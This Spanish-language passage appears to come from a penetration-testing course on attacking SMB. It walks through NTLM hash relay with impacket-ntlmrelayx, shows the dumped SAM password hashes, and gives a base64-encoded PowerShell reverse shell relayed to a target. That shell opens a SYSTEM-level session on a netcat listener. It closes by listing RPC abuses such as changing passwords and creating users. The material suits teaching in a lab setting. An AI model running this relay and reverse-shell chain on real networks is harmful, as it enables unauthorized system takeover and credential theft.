El hash NTLMv2 fue crackeado. La contraseña es `P@ssword`. Si no podemos crackear el hash, podemos potencialmente reenviar el hash capturado a otra máquina utilizando [impacket-ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) o Responder [MultiRelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py). Veamos un ejemplo utilizando `impacket-ntlmrelayx`.

Primero, necesitamos configurar SMB a `OFF` en nuestro archivo de configuración de responder (`/etc/responder/Responder.conf`).

```r
cat /etc/responder/Responder.conf | grep 'SMB ='

SMB = Off
```

Luego ejecutamos `impacket-ntlmrelayx` con la opción `--no-http-server`, `-smb2support`, y la máquina objetivo con la opción `-t`. Por defecto, `impacket-ntlmrelayx` volcará la base de datos SAM, pero podemos ejecutar comandos añadiendo la opción `-c`.

```r
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

<SNIP>

[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up WCF Server

[*] Servers started, waiting for connections

[*] SMBD-Thread-3: Connection from /ADMINISTRATOR@10.10.110.1 controlled, attacking target smb://10.10.110.146
[*] Authenticating against smb://10.10.110.146 as /ADMINISTRATOR SUCCEED
[*] SMBD-Thread-3: Connection from /ADMINISTRATOR@10.10.110.1 controlled, but there are no more targets left!
[*] SMBD-Thread-5: Connection from /ADMINISTRATOR@10.10.110.1 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xeb0432b45874953711ad55884094e9d4
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:92512f2605074cfc341a7f16e5fabf08:::
demouser:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
test:1001:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
[*] Done dumping SAM hashes for host: 10.10.110.146
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```

Podemos crear una reverse shell de PowerShell utilizando [https://www.revshells.com/](https://www.revshells.com/), configurando la dirección IP de nuestra máquina, el puerto y la opción Powershell #3 (Base64).

```r
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG5AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG5AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
```

Una vez que la víctima se autentica en nuestro servidor, envenenamos la respuesta y hacemos que ejecute nuestro comando para obtener una reverse shell.

```r
nc -lvnp 9001

listening on [any] 9001 ...
connect to [10.10.110.133] from (UNKNOWN) [10.10.110.146] 52471

PS C:\Windows\system32> whoami;hostname

nt authority\system
WIN11BOX
```

### RPC

En el [Footprinting module](https://academy.hackthebox.com/course/preview/footprinting), discutimos cómo enumerar una máquina utilizando RPC. Además de la enumeración, podemos usar RPC para realizar cambios en el sistema, como:

- Cambiar la contraseña de un usuario.
- Crear un nuevo usuario de dominio.
- Crear una nueva carpeta compartida.

También cubrimos la enumeración usando RPC en el [Active Directory Enumeration & Attacks module](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks).

Ten en cuenta que se requieren algunas configuraciones específicas para permitir estos tipos de cambios a través de RPC. Podemos usar la [rpclient man page](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) o el [SMB Access from Linux Cheat Sheet](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf) del SANS Institute para

 explorar esto más a fondo.